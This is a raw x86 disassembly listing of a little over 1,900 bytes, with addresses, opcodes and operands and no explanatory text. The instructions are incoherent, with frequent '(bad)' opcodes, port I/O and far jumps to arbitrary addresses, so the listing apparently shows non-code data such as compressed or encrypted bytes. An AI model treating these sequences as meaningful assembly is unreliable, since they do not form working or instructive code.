  41e4c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4ca:	fbld   TBYTE PTR [eax+0x26]
  41e4cd:	call   0xbbd2:0xadb98a6e
  41e4d4:	cmp    eax,0x6a534e43
  41e4d9:	mov    cl,0x16
  41e4db:	mov    al,ds:0xa1425d44
  41e4e0:	clc    
  41e4e1:	push   edx
  41e4e2:	pop    esi
  41e4e3:	aaa    
  41e4e4:	retf   0x9b71
  41e4e7:	xchg   BYTE PTR [edi+0x3f9d508e],cl
  41e4ed:	sub    al,0xa8
  41e4ef:	loop   0x41e500
  41e4f1:	jnp    0x41e4f4
  41e4f3:	lea    ebp,[edx]
  41e4f5:	out    0x9d,eax
  41e4f7:	mov    esp,0x9e018f88
  41e4fc:	mov    dl,ah
  41e4fe:	jg     0x41e49c
  41e500:	dec    esi
  41e501:	pop    esi
  41e502:	mov    eax,0x346eb203
  41e507:	lods   al,BYTE PTR ds:[esi]
  41e508:	mov    al,0x2c
  41e50a:	aam    0x78
  41e50c:	jmp    0x5bd52eb6
  41e511:	jbe    0x41e4a4
  41e513:	(bad)  
  41e514:	dec    ebp
  41e515:	xlat   BYTE PTR ds:[ebx]
  41e516:	js     0x41e51d
  41e518:	add    DWORD PTR [edx-0x1c],esp
  41e51b:	add    bl,dl
  41e51d:	add    eax,0xa8ef256e
  41e522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e523:	mov    es,WORD PTR [edi+edi*8-0x37dd4ad9]
  41e52a:	inc    ebp
  41e52b:	mov    bl,0x97
  41e52d:	cdq    
  41e52e:	mov    es,WORD PTR [esi+0x28]
  41e531:	leave  
  41e532:	(bad)  
  41e534:	inc    ebx
  41e535:	xor    eax,0x8cf158ea
  41e53a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e53b:	mov    eax,ds:0x322bc71f
  41e540:	xchg   DWORD PTR [edi+0x73696ce6],edx
  41e546:	jmp    0x41e515
  41e548:	(bad)  
  41e549:	push   ecx
  41e54a:	fbld   TBYTE PTR [ebp+ecx*4-0x34]
  41e54e:	mov    edi,0xd72fe20f
  41e553:	mov    BYTE PTR [ebx+0x5e62e675],bl
  41e559:	xor    al,0xe5
  41e55b:	mov    ebp,ecx
  41e55d:	and    eax,DWORD PTR [esi+0x176460d6]
  41e563:	shl    DWORD PTR ds:0xc8de5bc2,1
  41e569:	(bad)  
  41e56b:	jnp    0x41e543
  41e56d:	sub    dl,bl
  41e56f:	push   ecx
  41e570:	cmp    eax,0x9a03b699
  41e575:	mov    edi,0x7d063b73
  41e57a:	mov    dh,bl
  41e57c:	dec    esp
  41e57d:	mov    edx,0x9ee8e96e
  41e582:	dec    eax
  41e583:	pop    esi
  41e584:	inc    ecx
  41e585:	jle    0x41e5c2
  41e587:	ins    DWORD PTR es:[edi],dx
  41e588:	jecxz  0x41e558
  41e58a:	popf   
  41e58b:	and    BYTE PTR [ecx],bh
  41e58d:	add    al,0xd5
  41e58f:	loop   0x41e5f3
  41e591:	push   ecx
  41e593:	or     eax,0x3320ddf2
  41e599:	push   cs
  41e59a:	mov    eax,ds:0x2693d5fe
  41e59f:	mov    esp,0x92012fcb
  41e5a4:	imul   edi,DWORD PTR [edx],0xffffff87
  41e5a7:	std    
  41e5a8:	and    eax,0x32605c76
  41e5ad:	add    DWORD PTR [ebx+0x9],eax
  41e5b0:	dec    eax
  41e5b1:	mov    ds:0x74f7d387,al
  41e5b6:	sub    BYTE PTR [ecx+0x7a],al
  41e5b9:	push   ebp
  41e5ba:	fidiv  WORD PTR [edx-0x67]
  41e5bd:	lds    ecx,FWORD PTR [edi+0x32]
  41e5c0:	ja     0x41e5a1
  41e5c2:	test   eax,0x28e6e04b
  41e5c7:	jp     0x41e55f
  41e5c9:	ret    0x77ef
  41e5cc:	jl     0x41e56c
  41e5ce:	mov    al,ds:0x27cf46e9
  41e5d3:	gs pop ecx
  41e5d5:	xor    edx,DWORD PTR [esi-0x2b1bfff2]
  41e5db:	sub    DWORD PTR es:[esi+0x5910f97a],0x7
  41e5e3:	mov    dl,0x7e
  41e5e5:	outs   dx,BYTE PTR ds:[esi]
  41e5e6:	jmp    0x9e04c8d6
  41e5eb:	mov    esi,0x9d136d2f
  41e5f0:	mov    cl,0x97
  41e5f2:	xor    esi,0x33e55d18
  41e5f8:	xor    al,0x55
  41e5fa:	inc    esi
  41e5fb:	pop    edi
  41e5fc:	pop    ss
  41e5fd:	sub    BYTE PTR [edi-0x1ad257ad],ch
  41e603:	stos   DWORD PTR es:[edi],eax
  41e604:	and    DWORD PTR [esi],ebx
  41e606:	jae    0x41e66c
  41e608:	and    bl,BYTE PTR ds:0xb38cba75
  41e60e:	xchg   BYTE PTR [edi+0x74],bh
  41e611:	(bad)  
  41e612:	pusha  
  41e613:	adc    eax,0x70d52d45
  41e618:	xor    cl,BYTE PTR [ecx+edx*8]
  41e61b:	sbb    ecx,DWORD PTR [esi+0x6b]
  41e61e:	lods   eax,DWORD PTR ds:[esi]
  41e61f:	jo     0x41e646
  41e621:	pusha  
  41e622:	sub    ah,BYTE PTR [edx-0x3c9b6cac]
  41e628:	test   DWORD PTR [ebx+0x2b04aced],esi
  41e62e:	sbb    BYTE PTR [edi+0x43cbb35e],0x69
  41e635:	dec    edx
  41e636:	and    al,0xce
  41e638:	add    eax,ebx
  41e63a:	sub    esi,esp
  41e63c:	xor    ecx,DWORD PTR [ebp-0x1d]
  41e63f:	out    0x44,al
  41e641:	fsubp  st(0),st
  41e643:	pop    esp
  41e644:	xchg   esp,eax
  41e645:	sub    eax,0xda541c7e
  41e64a:	mov    bl,0x5e
  41e64c:	and    BYTE PTR [eax+0x34bd3f33],dh
  41e652:	out    0x96,al
  41e654:	rcl    BYTE PTR [ebp+0x2c],0xa7
  41e658:	pusha  
  41e659:	mov    eax,ds:0x53e85ed9
  41e65e:	nop
  41e65f:	(bad)  
  41e660:	scas   al,BYTE PTR es:[edi]
  41e661:	jmp    0x596d6124
  41e666:	sbb    esi,eax
  41e668:	ret    0x70c7
  41e66b:	xchg   ebx,eax
  41e66d:	scas   eax,DWORD PTR es:[edi]
  41e66e:	xchg   ecx,eax
  41e66f:	xor    edx,DWORD PTR [esi*8+0x3209aab4]
  41e676:	sti    
  41e677:	dec    ebx
  41e678:	scas   eax,DWORD PTR es:[edi]
  41e679:	xchg   esi,eax
  41e67a:	add    al,0xd0
  41e67c:	sub    al,0x29
  41e67e:	iret   
  41e67f:	mov    dl,0xfa
  41e681:	leave  
  41e682:	xlat   BYTE PTR ds:[ebx]
  41e683:	call   0x692f:0xda02576c
  41e68a:	push   ss
  41e68b:	imul   DWORD PTR [esi+esi*8+0x1216bbad]
  41e692:	mov    dl,0x26
  41e694:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e695:	dec    ebx
  41e696:	cld    
  41e697:	xchg   esi,eax
  41e698:	jecxz  0x41e685
  41e69a:	fiadd  WORD PTR [ebx]
  41e69c:	sub    al,0x75
  41e69e:	leave  
  41e69f:	lds    eax,FWORD PTR [edi]
  41e6a1:	rol    DWORD PTR [edi+0x39],1
  41e6a4:	(bad)  
  41e6a6:	je     0x41e725
  41e6a8:	sbb    BYTE PTR [edi],dh
  41e6aa:	shl    DWORD PTR [ebx],1
  41e6ac:	jmp    0x29c2f230
  41e6b1:	add    ch,BYTE PTR [ecx-0x6d958c9d]
  41e6b7:	push   0x9de3be8d
  41e6bc:	and    ebp,DWORD PTR [edi-0x48df27f6]
  41e6c2:	jne    0x41e689
  41e6c4:	xor    ebx,DWORD PTR [ebx+0x7a575abb]
  41e6ca:	stc    
  41e6cb:	fbld   TBYTE PTR [esi+0x6b]
  41e6ce:	mov    cl,0xf2
  41e6d0:	lahf   
  41e6d1:	cmp    al,0x2e
  41e6d3:	pop    ebp
  41e6d4:	ins    DWORD PTR es:[edi],dx
  41e6d5:	cld    
  41e6d6:	fwait
  41e6d7:	retf   0x8178
  41e6da:	or     DWORD PTR [edx-0x71],ecx
  41e6dd:	sub    DWORD PTR [edx],esi
  41e6df:	jp     0x41e741
  41e6e1:	lods   eax,DWORD PTR ds:[esi]
  41e6e2:	leave  
  41e6e3:	mov    ds:0x4e3e3e17,al
  41e6e8:	loopne 0x41e709
  41e6ea:	and    BYTE PTR [ebx-0x26618ea1],bh
  41e6f0:	mov    ds:0x7c3497f4,al
  41e6f5:	mov    ds:0x34a7c93f,eax
  41e6fa:	or     eax,0x7973a8c9
  41e6ff:	pop    ebp
  41e700:	jmp    0xec7403fd
  41e705:	pop    esi
  41e706:	cwde   
  41e707:	or     al,BYTE PTR [ecx]
  41e709:	arpl   dx,dx
  41e70b:	aas    
  41e70c:	popf   
  41e70d:	mov    edx,0x5bcabecf
  41e712:	les    ebx,FWORD PTR [esi-0x74]
  41e715:	push   edx
  41e716:	addr16 mov bl,0x96
  41e719:	mov    edi,ebp
  41e71b:	enter  0xe120,0x10
  41e71f:	popf   
  41e720:	out    dx,eax
  41e721:	fs pop ebp
  41e723:	or     esi,esi
  41e725:	dec    eax
  41e726:	jnp    0x41e762
  41e728:	mov    DWORD PTR [edi-0x33361230],edx
  41e72e:	enter  0xe8ac,0xc9
  41e732:	add    ebx,DWORD PTR [ebp+0x37]
  41e735:	(bad)  
  41e736:	les    ebx,FWORD PTR [edi]
  41e738:	mov    bl,0x17
  41e73a:	push   ecx
  41e73b:	aaa    
  41e73c:	mov    edi,0xfdbecc06
  41e741:	(bad)  
  41e742:	scas   al,BYTE PTR es:[edi]
  41e743:	call   0x26c453bb
  41e748:	rcl    DWORD PTR [edx+0x2444b0a2],1
  41e74e:	adc    al,0x9d
  41e750:	add    ecx,DWORD PTR [esi-0x6313d136]
  41e756:	call   0xa723c93f
  41e75b:	cld    
  41e75c:	xchg   ecx,eax
  41e75d:	ja     0x41e7b2
  41e75f:	pop    esp
  41e760:	ret    
  41e761:	clc    
  41e762:	and    BYTE PTR [ecx+0x58f803fc],bh
  41e768:	into   
  41e769:	mov    edx,0xcba523c1
  41e76e:	inc    ebx
  41e76f:	xchg   esp,eax
  41e770:	repnz repnz jmp 0xe872:0xd27bc053
  41e779:	adc    eax,0x6838903a
  41e77e:	(bad)  
  41e77f:	in     al,0x20
  41e781:	ja     0x41e7cc
  41e783:	or     DWORD PTR [edi+0x2aba23e],edi
  41e789:	arpl   WORD PTR [ebx-0x1e],bp
  41e78c:	(bad)  
  41e78d:	and    cl,BYTE PTR [edx]
  41e78f:	or     DWORD PTR [ebp+0x6adb8138],ebp
  41e795:	lods   eax,DWORD PTR ds:[esi]
  41e796:	pop    DWORD PTR [ecx]
  41e798:	jecxz  0x41e75b
  41e79a:	mov    ecx,0xc4fc95f8
  41e79f:	aam    0x11
  41e7a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7a2:	inc    esi
  41e7a3:	gs pop es
  41e7a5:	dec    ecx
  41e7a6:	mov    edx,0x64a126ab
  41e7ab:	js     0x41e746
  41e7ad:	(bad)  
  41e7ae:	icebp  
  41e7af:	mov    dl,al
  41e7b1:	adc    DWORD PTR gs:[esi+eiz*8+0x107d6d79],0xffffffa1
  41e7ba:	outs   dx,BYTE PTR ds:[esi]
  41e7bb:	dec    ebp
  41e7bc:	leave  
  41e7bd:	stc    
  41e7be:	mov    esi,0xb9629e14
  41e7c3:	ret    
  41e7c4:	shl    DWORD PTR [eax-0x5f],0xa4
  41e7c8:	or     ch,BYTE PTR [ebx+0x1c]
  41e7cb:	shl    edx,1
  41e7cd:	stc    
  41e7ce:	outs   dx,BYTE PTR ds:[esi]
  41e7cf:	mov    dh,0xe3
  41e7d1:	and    eax,0xb35724a
  41e7d6:	pop    edx
  41e7d7:	test   eax,ebp
  41e7d9:	adc    BYTE PTR ds:0x17c691c9,ah
  41e7df:	pop    ebp
  41e7e0:	cdq    
  41e7e1:	and    eax,0x678e3976
  41e7e6:	test   BYTE PTR [eax],ch
  41e7e8:	retf   0xa002
  41e7eb:	push   esi
  41e7ec:	scas   eax,DWORD PTR es:[edi]
  41e7ed:	dec    ebp
  41e7ee:	and    BYTE PTR [ebp-0xf],0x55
  41e7f2:	inc    eax
  41e7f3:	cmp    esi,esp
  41e7f5:	fist   WORD PTR [edx+0x2f]
  41e7f8:	jo     0x41e81e
  41e7fa:	add    eax,0x8c94d351
  41e7ff:	jl     0x41e787
  41e801:	test   al,0x15
  41e803:	fimul  DWORD PTR [eax]
  41e805:	addr16 mov al,ds:0xbcee
  41e809:	rol    BYTE PTR [ebp-0x8c51d5f],0x48
  41e810:	mov    cl,0xe3
  41e812:	xchg   ecx,eax
  41e813:	retf   0x9417
  41e816:	out    dx,eax
  41e817:	mov    esp,0xe49e107f
  41e81c:	pop    ebp
  41e81d:	fstp   DWORD PTR [eax-0x67]
  41e820:	sbb    al,0x4
  41e822:	push   cs
  41e823:	cmp    BYTE PTR [edi+0x57eba80c],ch
  41e829:	cmp    dl,dl
  41e82b:	in     eax,dx
  41e82c:	lods   al,BYTE PTR ds:[esi]
  41e82d:	inc    esi
  41e82e:	out    dx,eax
  41e82f:	in     eax,0x1e
  41e831:	icebp  
  41e832:	neg    BYTE PTR [esi-0x10]
  41e835:	jns    0x41e813
  41e837:	dec    ecx
  41e838:	std    
  41e839:	stc    
  41e83a:	sbb    eax,0xb10abb0e
  41e83f:	cmp    al,0xa1
  41e841:	icebp  
  41e842:	dec    ecx
  41e843:	test   DWORD PTR [ebp+ecx*2+0x75355426],ebx
  41e84a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e84b:	dec    esi
  41e84c:	pop    es
  41e84d:	push   esi
  41e84e:	sbb    esp,DWORD PTR [ebx]
  41e850:	imul   ebx,DWORD PTR [ebx+0x47],0x6048f07a
  41e857:	push   0x78
  41e859:	or     al,0x89
  41e85b:	mov    esp,0xfe803aac
  41e860:	xlat   BYTE PTR ds:[ebx]
  41e861:	div    DWORD PTR [esi+0x30]
  41e864:	in     eax,dx
  41e865:	add    ebx,DWORD PTR [ebx-0x4986f79c]
  41e86b:	retf   
  41e86c:	clc    
  41e86d:	sar    DWORD PTR [edi+0x4e],1
  41e870:	jg     0x41e8a6
  41e872:	mov    ah,0x57
  41e874:	lock dec esp
  41e876:	shl    DWORD PTR [edi+0x749ab847],cl
  41e87c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e87d:	(bad)  
  41e87e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e87f:	push   0x1b
  41e881:	mov    cl,0xab
  41e883:	add    al,0x94
  41e885:	pop    edi
  41e886:	and    BYTE PTR [ebp-0x456c983e],bl
  41e88c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e88d:	fild   DWORD PTR [esi]
  41e88f:	addr16 sub al,0xc5
  41e892:	mov    al,0xc9
  41e894:	pop    ebp
  41e895:	fadd   DWORD PTR [edx-0x6128db6a]
  41e89b:	mov    ch,ah
  41e89d:	dec    edx
  41e89e:	xchg   edx,eax
  41e89f:	push   ebp
  41e8a0:	ret    
  41e8a1:	sbb    DWORD PTR [ebx+edi*2+0x34],ecx
  41e8a5:	out    dx,al
  41e8a6:	aaa    
  41e8a7:	stos   DWORD PTR es:[edi],eax
  41e8a8:	outs   dx,DWORD PTR ds:[esi]
  41e8a9:	ins    BYTE PTR es:[edi],dx
  41e8aa:	shl    DWORD PTR [edi+0x6be36171],cl
  41e8b0:	cmp    eax,0xc4222944
  41e8b5:	add    esp,DWORD PTR [ebx-0x1f]
  41e8b8:	fisttp QWORD PTR [ecx]
  41e8ba:	not    DWORD PTR [ebp+0x530c488c]
  41e8c0:	mov    ecx,0x690d72c6
  41e8c5:	cwde   
  41e8c6:	ins    BYTE PTR es:[edi],dx
  41e8c7:	add    eax,0x27575ad4
  41e8cc:	cmp    al,0x13
  41e8ce:	retf   0xeafc
  41e8d1:	add    eax,0x97076b1f
  41e8d6:	jnp    0x41e8c1
  41e8d8:	enter  0xe046,0xe9
  41e8dc:	dec    esi
  41e8dd:	(bad)  [eax-0x3eed9298]
  41e8e3:	mov    bl,0xd4
  41e8e5:	or     eax,0x6f25366c
  41e8ea:	das    
  41e8eb:	adc    bl,BYTE PTR [esi+esi*4+0x64]
  41e8ef:	inc    edi
  41e8f0:	pusha  
  41e8f1:	jle    0x41e90b
  41e8f3:	stos   DWORD PTR es:[edi],eax
  41e8f4:	or     esp,DWORD PTR ds:0x161280a8
  41e8fa:	cmp    cl,bh
  41e8fc:	in     al,0x64
  41e8fe:	(bad)  
  41e8ff:	std    
  41e900:	xchg   ebx,eax
  41e901:	xor    esp,DWORD PTR [ebx]
  41e903:	test   al,0x4a
  41e905:	nop
  41e906:	jle    0x41e956
  41e908:	cmc    
  41e909:	aaa    
  41e90a:	popf   
  41e90b:	mov    dl,0xb0
  41e90d:	push   ebp
  41e90e:	sbb    ebx,DWORD PTR [ecx]
  41e910:	cmc    
  41e911:	loop   0x41e914
  41e913:	popf   
  41e914:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e915:	sbb    esi,0xcb6c1901
  41e91b:	pop    ds
  41e91c:	mov    BYTE PTR [ecx+0x57],0x5c
  41e920:	mov    esp,0xfef70b58
  41e925:	jnp    0x41e93f
  41e927:	xchg   esp,eax
  41e928:	mov    bl,0xb0
  41e92a:	cli    
  41e92b:	popa   
  41e92c:	cmp    al,0xcb
  41e92e:	push   ebp
  41e92f:	fs sahf 
  41e931:	imul   edi,ebp,0xa2c69518
  41e937:	inc    esi
  41e938:	test   al,0x7a
  41e93a:	call   0xd425fb94
  41e93f:	adc    bh,ah
  41e941:	dec    esi
  41e942:	cmp    eax,0x4cf5c355
  41e947:	aas    
  41e948:	adc    ebp,0x25
  41e94b:	mov    dh,BYTE PTR [edx-0x22de192b]
  41e951:	das    
  41e952:	or     bl,BYTE PTR [ebx-0x63bcedc7]
  41e958:	iret   
  41e959:	adc    ch,BYTE PTR [ebx+0x4]
  41e95c:	mov    cl,0xa
  41e95e:	jne    0x41e94f
  41e960:	loopne 0x41e976
  41e962:	fistp  QWORD PTR [ebx-0x5e]
  41e965:	cmp    ch,BYTE PTR [ebx+0x37]
  41e968:	xor    eax,0x7abd4746
  41e96d:	sbb    bh,BYTE PTR [ebp+0x35]
  41e970:	push   esp
  41e971:	add    esi,DWORD PTR [esp+edx*1-0x2b]
  41e975:	leave  
  41e976:	push   edi
  41e977:	dec    esp
  41e978:	sahf   
  41e979:	jb     0x41e933
  41e97b:	mov    ebp,0xede9fed9
  41e980:	aas    
  41e981:	es inc esp
  41e983:	push   ds
  41e984:	sti    
  41e985:	inc    edi
  41e986:	sbb    DWORD PTR [ecx+0x61100b42],edi
  41e98c:	sbb    BYTE PTR [ebp+eiz*8-0x42322080],0x97
  41e994:	ss lahf 
  41e996:	loope  0x41e9ed
  41e998:	inc    edx
  41e999:	push   ss
  41e99a:	and    bh,dl
  41e99c:	mov    bl,cl
  41e99e:	call   0x754c:0x61b0f753
  41e9a5:	inc    esi
  41e9a6:	jb     0x41e972
  41e9a8:	scas   eax,DWORD PTR es:[edi]
  41e9a9:	sub    BYTE PTR [eax],ch
  41e9ab:	ds dec esp
  41e9ad:	xchg   esp,eax
  41e9ae:	and    ebx,ebx
  41e9b0:	adc    eax,0x4ae042e8
  41e9b5:	dec    ebp
  41e9b6:	jmp    0xcb06:0xaa63f08a
  41e9bd:	std    
  41e9be:	mov    al,ds:0x4be76d19
  41e9c3:	pop    edi
  41e9c4:	enter  0x6c2a,0x32
  41e9c8:	mov    bh,0x8e
  41e9ca:	mov    esp,0x3fba4818
  41e9cf:	fsub   QWORD PTR [ebx+esi*8]
  41e9d2:	pop    es
  41e9d3:	ja     0x41ea47
  41e9d5:	into   
  41e9d6:	in     eax,0x25
  41e9d8:	cli    
  41e9d9:	in     eax,0x65
  41e9db:	jb     0x41e97c
  41e9dd:	mov    ch,BYTE PTR [eax-0x57afc688]
  41e9e3:	mov    ebp,0x6734579f
  41e9e8:	in     al,dx
  41e9e9:	xor    BYTE PTR [edx+edi*4],dh
  41e9ec:	or     al,0xfc
  41e9ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9ef:	jb     0x41ea2c
  41e9f1:	push   ebx
  41e9f2:	sbb    esi,DWORD PTR [ecx]
  41e9f4:	dec    edx
  41e9f5:	out    0x11,eax
  41e9f7:	in     eax,0x51
  41e9f9:	popa   
  41e9fa:	jge    0x41e995
  41e9fc:	xchg   dl,cl
  41e9fe:	xchg   ebp,eax
  41e9ff:	xlat   BYTE PTR ds:[ebx]
  41ea00:	fcom   st(7)
  41ea02:	lock jno 0x41ea08
  41ea05:	lea    edx,[eax+0xc]
  41ea08:	addr16 inc edx
  41ea0a:	arpl   WORD PTR [edi],dx
  41ea0c:	mov    ch,0x71
  41ea0e:	mov    dl,0x30
  41ea10:	mov    ebp,gs
  41ea12:	pushf  
  41ea13:	pop    eax
  41ea15:	iret   
  41ea16:	in     eax,dx
  41ea17:	jb     0x41ea77
  41ea19:	stc    
  41ea1a:	jle    0x41ea77
  41ea1c:	jle    0x41e9f9
  41ea1e:	dec    ax
  41ea20:	xchg   esp,eax
  41ea21:	test   DWORD PTR ds:0x6deb4ba7,ebx
  41ea27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea28:	cmp    DWORD PTR [esi+0x51],esi
  41ea2b:	iret   
  41ea2c:	push   cs
  41ea2d:	xor    BYTE PTR [ecx],0x73
  41ea30:	jp     0x41e9e8
  41ea32:	aaa    
  41ea33:	jnp    0x41ea0a
  41ea35:	xacquire xchg BYTE PTR [ebx],ch
  41ea38:	call   0x5a5db460
  41ea3d:	xor    BYTE PTR [eax+ecx*2-0x1f6eb8a3],bh
  41ea44:	mov    dh,0x9b
  41ea46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea47:	pusha  
  41ea48:	enter  0x7578,0x30
  41ea4c:	ds leave 
  41ea4e:	jno    0x41ea80
  41ea50:	jmp    0x8ea5:0x62dc6b2c
  41ea57:	call   0x124b3332
  41ea5c:	add    eax,0x4c02edb4
  41ea61:	mov    ebp,fs
  41ea63:	jmp    0x41ea55
  41ea65:	(bad)  
  41ea66:	bound  edi,QWORD PTR [ebx]
  41ea68:	or     al,BYTE PTR [esi-0x2d]
  41ea6b:	pop    ds
  41ea6c:	aas    
  41ea6d:	and    ebp,ebp
  41ea6f:	cmc    
  41ea70:	cmp    al,0x88
  41ea72:	loope  0x41ea03
  41ea74:	pop    esp
  41ea75:	into   
  41ea76:	push   ebp
  41ea77:	dec    edx
  41ea78:	test   al,0xb6
  41ea7a:	fadd   DWORD PTR [edi]
  41ea7c:	cld    
  41ea7d:	add    al,0x74
  41ea7f:	aad    0x18
  41ea81:	push   ss
  41ea82:	sbb    DWORD PTR [ebx+0x138c1612],edx
  41ea88:	mov    esi,ebx
  41ea8a:	in     al,0x73
  41ea8c:	aaa    
  41ea8d:	mov    esi,0xc09d999e
  41ea92:	and    al,0x33
  41ea94:	es jmp 0x41eaf3
  41ea97:	pushf  
  41ea98:	sahf   
  41ea99:	mov    edi,0x22a17a4c
  41ea9e:	loope  0x41ea7b
  41eaa0:	sub    ebp,0x83f29499
  41eaa6:	push   ds
  41eaa7:	clc    
  41eaa8:	xor    dh,al
  41eaaa:	mov    dl,cl
  41eaac:	inc    edx
  41eaad:	out    dx,al
  41eaae:	sar    DWORD PTR [esp+edx*8-0x7a8ccd9b],0x48
  41eab6:	jne    0x41ea86
  41eab8:	jle    0x41eaa3
  41eaba:	mov    ah,0x64
  41eabc:	repnz pop eax
  41eabe:	xchg   ebp,eax
  41eabf:	icebp  
  41eac0:	stc    
  41eac1:	jbe    0x41eb31
  41eac3:	je     0x41eb0e
  41eac5:	push   0xd
  41eac7:	xchg   ecx,eax
  41eac8:	ss pop es
  41eaca:	adc    eax,0x217e9fa6
  41eacf:	mov    eax,ds:0x83c93cb4
  41ead4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ead5:	pop    esp
  41ead6:	dec    edi
  41ead7:	xor    ecx,DWORD PTR [eax]
  41ead9:	mov    ah,al
  41eadb:	sbb    bh,dh
  41eadd:	push   ebp
  41eade:	imul   esi,DWORD PTR [ebx],0x1c970429
  41eae4:	or     edx,esi
  41eae6:	jecxz  0x41eac3
  41eae8:	rol    BYTE PTR [edi],1
  41eaea:	push   esi
  41eaeb:	xor    ah,BYTE PTR [ecx+0x68892c1d]
  41eaf1:	iret   
  41eaf2:	and    DWORD PTR [esi+0x7e0091f8],edi
  41eaf8:	fild   DWORD PTR [esi]
  41eafa:	lea    edi,[edi]
  41eafc:	add    dh,bh
  41eafe:	ret    
  41eaff:	jno    0x41eae0
  41eb01:	das    
  41eb02:	fbld   TBYTE PTR [ebx]
  41eb04:	std    
  41eb05:	mov    esi,0x6e4b25b2
  41eb0a:	or     DWORD PTR [esi-0x5b],edx
  41eb0d:	xor    edx,DWORD PTR [ecx]
  41eb0f:	sbb    eax,0x4884f382
  41eb14:	fcomp  QWORD PTR [edx]
  41eb16:	xor    al,0xa7
  41eb18:	mov    ds:0xdf93e0eb,al
  41eb1d:	sbb    edx,DWORD PTR [ecx-0x4a]
  41eb20:	inc    edx
  41eb21:	sbb    edi,ebx
  41eb23:	mov    eax,ds:0xcd7a8b3f
  41eb28:	pop    ss
  41eb29:	sbb    al,0x1f
  41eb2b:	and    DWORD PTR [esi+0x59f4acf5],edi
  41eb31:	pop    ebx
  41eb32:	nop
  41eb33:	fiadd  WORD PTR [ebx+0x75d6e002]
  41eb39:	pop    edi
  41eb3a:	xchg   bh,bh
  41eb3c:	test   DWORD PTR [ecx+0x5e],edi
  41eb3f:	and    eax,0xce58dc36
  41eb44:	xchg   edi,eax
  41eb45:	sub    al,0x6b
  41eb47:	rcr    BYTE PTR [eax],1
  41eb49:	and    ebx,ebx
  41eb4b:	sbb    eax,0xb76d0c8b
  41eb50:	cs mov bl,0xef
  41eb53:	pop    es
  41eb54:	call   0xda5677ea
  41eb59:	xor    ebx,esi
  41eb5b:	inc    ebp
  41eb5c:	pop    ebx
  41eb5d:	jmp    0x41eb67
  41eb5f:	scas   eax,DWORD PTR es:[edi]
  41eb60:	fdiv   QWORD PTR [eax+0x57]
  41eb63:	lds    dx,DWORD PTR [edi-0x76]
  41eb67:	mov    esp,0x7f82f383
  41eb6c:	sub    ebp,DWORD PTR [edi+esi*4-0x6f]
  41eb70:	push   ss
  41eb71:	je     0x41eb79
  41eb73:	popa   
  41eb74:	fmul   QWORD PTR ds:0xd9e77d6b
  41eb7a:	sti    
  41eb7b:	js     0x41eb7b
  41eb7d:	push   eax
  41eb7e:	pop    eax
  41eb7f:	lds    edi,FWORD PTR [edx-0x2d81b0e6]
  41eb85:	in     eax,0x3d
  41eb87:	scas   eax,DWORD PTR es:[edi]
  41eb88:	jo     0x41eb16
  41eb8a:	leave  
  41eb8b:	jmp    0x41ebb7
  41eb8d:	push   edi
  41eb8e:	mov    eax,0x2017b54a
  41eb93:	popa   
  41eb94:	outs   dx,DWORD PTR ds:[esi]
  41eb95:	pushf  
  41eb96:	ins    DWORD PTR es:[edi],dx
  41eb97:	xor    eax,0x298cda2c
  41eb9c:	scas   eax,DWORD PTR es:[edi]
  41eb9d:	lds    edi,FWORD PTR [eax]
  41eb9f:	pusha  
  41eba0:	scas   eax,DWORD PTR es:[edi]
  41eba1:	(bad)  
  41eba2:	lods   eax,DWORD PTR ds:[esi]
  41eba3:	fmul   st(2),st
  41eba5:	retf   0xfbf4
  41eba8:	popa   
  41eba9:	mov    ebp,0xdd32ab23
  41ebae:	cld    
  41ebaf:	test   eax,0x489a22c1
  41ebb4:	and    al,cl
  41ebb6:	and    eax,0x1a1bcf7b
  41ebbb:	fisttp QWORD PTR [ebp+0x205f0630]
  41ebc1:	pusha  
  41ebc2:	or     BYTE PTR [eax],0xbc
  41ebc5:	cs ja  0x41ec36
  41ebc8:	aas    
  41ebc9:	inc    eax
  41ebca:	push   ecx
  41ebcb:	jae    0x41ec42
  41ebcd:	stc    
  41ebce:	mov    ah,0xf4
  41ebd0:	sub    BYTE PTR [edx],ch
  41ebd2:	and    ch,BYTE PTR [ebx]
  41ebd4:	mov    ebx,0x49e669b7
  41ebd9:	inc    eax
  41ebda:	mov    ah,0xba
  41ebdc:	repnz stos BYTE PTR es:[edi],al
  41ebde:	arpl   WORD PTR [edx+0x62],sp
  41ebe1:	mov    eax,0xe6646c98
  41ebe6:	daa    
  41ebe7:	sub    BYTE PTR [eax-0x4239f092],0x37
  41ebee:	cmp    BYTE PTR [esi-0x2c],cl
  41ebf1:	les    ebx,FWORD PTR [edx-0x59]
  41ebf4:	into   
  41ebf5:	idiv   BYTE PTR [eax+ebp*2-0x6153d34b]
  41ebfc:	mov    bl,0x32
  41ebfe:	mov    ch,ah
  41ec00:	sub    DWORD PTR [ebx-0x1d],eax
  41ec03:	jb     0x41ebf2
  41ec05:	push   ss
  41ec06:	xchg   BYTE PTR [ebx+0x21714f9d],dl
  41ec0c:	push   esi
  41ec0d:	shl    ecx,cl
  41ec0f:	add    eax,DWORD PTR [ecx*1-0xaca5d36]
  41ec16:	mov    edi,0x18bd86e1
  41ec1b:	les    eax,FWORD PTR [ecx+0x5562a250]
  41ec21:	sar    DWORD PTR ds:0xa74f42a3,cl
  41ec27:	loope  0x41ec65
  41ec29:	or     cl,BYTE PTR [edx-0x43]
  41ec2c:	ins    DWORD PTR es:[edi],dx
  41ec2d:	enter  0x10c1,0xc4
  41ec31:	repnz pushf 
  41ec33:	pop    eax
  41ec34:	dec    edi
  41ec35:	out    dx,al
  41ec36:	xchg   edx,eax
  41ec37:	bound  esp,QWORD PTR [edx-0x4f]
  41ec3a:	loop   0x41ec6a
